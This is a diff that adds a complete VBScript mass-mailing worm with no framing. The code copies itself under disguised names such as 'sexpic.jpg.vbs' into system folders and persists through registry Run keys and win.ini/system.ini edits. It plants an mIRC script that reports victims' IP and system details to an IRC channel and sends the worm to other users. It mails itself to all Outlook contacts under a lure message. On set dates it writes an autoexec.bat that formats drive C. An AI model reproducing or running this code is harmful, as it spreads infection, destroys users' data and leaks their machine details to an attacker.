@@ -1,0 +1,167 @@
+
+sub Winsys()
+On Error Resume Next
+Dim obj, sysfldr,s, f
+Set obj = CreateObject("Scripting.FileSystemObject")
+Set sysfldr = obj.GetSpecialFolder(1)
+Set winfldr = obj.GetSpecialFolder(0)
+Set tmpfldr = obj.GetSpecialFolder(2)
+set s = CreateObject("Scripting.FileSystemObject")
+Set f = s.GetFile(WScript.ScriptFullName)
+f.copy(sysfldr&"\sexpic.jpg.vbs")
+f.copy(sysfldr&"\winsys.vbs")
+f.copy(winfldr&"\winsys.vbs")
+f.copy(tmpfldr&"\winsys.vbs")
+f.copy(sysfldr&"\kernel.vbs")
+f.copy(winfldr&"\winsck.vbs")
+f.copy(sysfldr&"\explorer.vbs")
+loc=winfldr&"\winsys.vbs"
+loc1=sysfldr&"\winsys.vbs"
+loc2=tmpfldr&"\winsys.vbs"
+loc3=sysfldr&"\kernel.vbs"
+loc4=winfldr&"\winsck.vbs"
+loc5="explorer.vbs"
+Set WSHShell = CreateObject("WScript.Shell")
+WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc
+WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1
+WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2
+editini winfldr&"\win.ini","[windows]","load",loc3
+editini winfldr&"\win.ini","[windows]","run",loc4
+editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5
+ntwrk()
+end sub
+sub infect(drive)
+On Error Resume Next
+set s = CreateObject("Scripting.FileSystemObject")
+Set f = s.GetFile(WScript.ScriptFullName)
+f.copy(drive & "\SexPics.jpg.vbs")
+path=drive&"\SexPics.jpg.vbs"
+end sub
+Function ShowDriveType(drvpath)
+On Error Resume Next
+Dim fso, d, t
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set d = fso.GetDrive(drvpath)
+Select Case d.DriveType
+Case 0: t = "Unknown"
+Case 1: t = "Removable"
+Case 2: t = "Fixed"
+Case 3: t = "Network"
+Case 4: t = "CD-ROM"
+Case 5: t = "RAM Disk"
+End Select
+if t = "" then t = "None"
+ShowDriveType = t
+End Function
+On error resume next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set b = fso.CreateTextFile("c:\mirc\script.ini", True)
+b.WriteLine "[script]"
+b.WriteLine "n0=;mIRC Protection Script DO NOT EDIT!"
+b.WriteLine "n1=;By Khaled Mardem-Bey"
+b.WriteLine "n2=;    www.mirc.com"
+b.WriteLine "n3="
+b.WriteLine "n4="
+b.WriteLine "n5="
+b.WriteLine "n6="
+b.WriteLine "n7=on 1:CONNECT:{"
+b.WriteLine "n8=  //.msg #sexysick Hi. $server $port $ip $os $time $date %chan it's been $+ $duration($calc($ticks / 1000)) since my last reboot! Mil0.5b"
+b.WriteLine "n9=}"
+b.WriteLine "n10=on 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
+b.WriteLine "n11=  /.dcc send $nick " & sysfldr&"sexpic.jpg.vbs"
+b.WriteLine "n12=}"
+b.WriteLine "n13=on 1:NICK: { if ($nick == $me) .msg #sexysick OldNick was $nick }"
+b.WriteLine "n14=on 1:notice:sex*:?: .msg #sexysick 0,3 $time $nick Killed me, closing mIRC... *I Am Gone* | exit"
+b.WriteLine "n15=on 1:notice:dick: /nick sexsick"
+b.WriteLine "n16=on 1:notice:pussy: /nick pussylicker"
+b.WriteLine "n17=on 1:notice:ass: /J #sex0"
+b.WriteLine "n18=on 1:notice:cum: /nick I_Love_dicks"
+b.WriteLine "n19=on 1:notice:sperm: /j #gayteen"
+b.close
+
+Set f = fso.OpenTextFile("c:\mirc\mirc.ini", 8, True)
+f.WriteLine "n100=c:\mirc\script.ini"
+f.Close
+
+Set Regedit = CreateObject("WScript.Shell")
+Regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinLoad", sysfldr & "sexpic.jpg.vbs"
+On Error Resume Next
+If day(now) = 13 and Month(now) = 02 then 
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set b = fso.CreateTextFile("c:\autoexec.bat", True)
+b.WriteLine "@Echo off"
+b.WriteLine "rem Microsoft (tm)"
+b.WriteLine "rem we found a bug named WINDOWS in your system"
+b.WriteLine "rem we are now trying to fixing it"
+b.WriteLine "  Format c: /autotest/q"
+WScript.echo "Error on startup, please reboot your system"
+End If
+
+If day(now) = 13 and month(now) = 07 then
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set b = fso.CreateTextFile("c:\autoexec.bat", True)
+b.WriteLine "@Echo off"
+b.WriteLine "rem Microsoft (tm)"
+b.WriteLine "rem we found a bug named WINDOWS in your system"
+b.WriteLine "rem we are now trying to fixing it"
+b.WriteLine "  Format c: /autotest/q"
+WScript.echo "Error on startup, please reboot your system"
+End If
+
+If day(now) = 13 and month(now) = 09 then 
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set b = fso.CreateTextFile("c:\autoexec.bat", True)
+b.WriteLine "@Echo off"
+b.WriteLine "rem Microsoft (tm)"
+b.WriteLine "rem we found a bug named WINDOWS in your system"
+b.WriteLine "rem we are now trying to fixing it"
+b.WriteLine "  Format c: /autotest/q"
+WScript.echo "Error on startup, please reboot your system"
+End If
+
+If day(now) = 13 and month(now) = 01 then 
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set b = fso.CreateTextFile("c:\autoexec.bat", True)
+b.WriteLine "@Echo off"
+b.WriteLine "rem Microsoft (tm)"
+b.WriteLine "rem we found a bug named WINDOWS in your system"
+b.WriteLine "rem we are now trying to fixing it"
+b.WriteLine "  Format c: /autotest/q"
+WScript.echo "Error on startup, please reboot your system"
+End If
+
+If day(now) = 10 or day(now) = 20 or day(now) = 30 then
+On Error Resume Next
+dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
+set regedit=CreateObject("WScript.Shell")
+set out=WScript.CreateObject("Outlook.Application")
+set mapi=out.GetNameSpace("MAPI")
+for ctrlists=1 to mapi.AddressLists.Count
+set a=mapi.AddressLists(ctrlists)
+x=1
+regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
+if (regv="") then
+regv=1
+end if
+if (int(a.AddressEntries.Count)>int(regv)) then
+for ctrentries=1 to a.AddressEntries.Count
+malead=a.AddressEntries(x)
+regad=""
+regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
+if (regad="") then
+set male=out.CreateItem(0)
+male.Recipients.Add(malead)
+male.Subject = "You gotta check it out"
+male.Body = vbcrlf&"You wont belive this picture I found in the net. Please open it now and see this amazing thing."
+male.Attachments.Add(sysfldr&"\SEXPIC.JPG.vbs")
+male.Send
+regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
+end if
+x=x+1
+next
+regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
+else
+regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
+end if
+next
+end if
